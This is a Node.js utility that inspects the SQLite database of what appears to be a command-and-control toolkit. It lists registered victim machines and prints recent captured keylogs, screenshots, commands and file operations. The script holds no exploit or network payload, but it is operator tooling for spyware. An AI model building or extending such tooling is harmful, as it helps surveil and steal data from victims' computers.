const Database = require('better-sqlite3');
const path = require('path');

console.log('Checking C2 Database...\n');

// Try bridge directory first
let dbPath = path.join(__dirname, 'bridge', 'c2_data.db');
let db;

try {
    db = new Database(dbPath);
    console.log(`✓ Database opened: ${dbPath}`);
} catch (err) {
    // Try root directory
    dbPath = path.join(__dirname, 'c2_data.db');
    try {
        db = new Database(dbPath);
        console.log(`✓ Database opened: ${dbPath}`);
    } catch (err2) {
        console.error('✗ Could not open database:', err2.message);
        process.exit(1);
    }
}

// List all tables
console.log('\n=== Database Tables ===');
const tables = db.prepare("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name").all();
tables.forEach(table => {
    console.log(`- ${table.name}`);
});

// Check clients table
console.log('\n=== Clients Table ===');
try {
    const clients = db.prepare('SELECT * FROM clients ORDER BY last_seen DESC').all();
    console.log(`Total clients: ${clients.length}`);
    
    if (clients.length > 0) {
        console.log('\nClient Details:');
        clients.forEach((client, i) => {
            console.log(`\n${i+1}. Client ID: ${client.id}`);
            console.log(`   IP: ${client.ip || 'N/A'}`);
            console.log(`   Hostname: ${client.hostname || 'N/A'}`);
            console.log(`   OS: ${client.os || 'N/A'}`);
            console.log(`   Last Seen: ${new Date(client.last_seen).toLocaleString()}`);
            console.log(`   Created: ${new Date(client.created_at).toLocaleString()}`);
        });
    } else {
        console.log('No clients registered yet.');
    }
} catch (err) {
    console.log('Clients table not found or error:', err.message);
}

// Check statistics
console.log('\n=== Statistics ===');
try {
    const stats = db.prepare('SELECT * FROM statistics ORDER BY name').all();
    if (stats.length > 0) {
        stats.forEach(stat => {
            console.log(`${stat.name}: ${stat.value}`);
        });
    } else {
        console.log('No statistics recorded yet.');
    }
} catch (err) {
    console.log('Statistics table not found or error:', err.message);
}

// Check other tables
const otherTables = ['screenshots', 'keylogs', 'commands', 'file_operations'];
otherTables.forEach(tableName => {
    console.log(`\n=== ${tableName.charAt(0).toUpperCase() + tableName.slice(1)} ===`);
    try {
        const count = db.prepare(`SELECT COUNT(*) as count FROM ${tableName}`).get().count;
        console.log(`Total records: ${count}`);
        
        if (count > 0) {
            const sample = db.prepare(`SELECT * FROM ${tableName} ORDER BY timestamp DESC LIMIT 3`).all();
            console.log('Recent entries:');
            sample.forEach((record, i) => {
                console.log(`  ${i+1}. ${JSON.stringify(record, null, 2).replace(/\n/g, '\n    ')}`);
            });
        }
    } catch (err) {
        console.log(`Table not found or error: ${err.message}`);
    }
});

db.close();
console.log('\n✓ Database check complete.');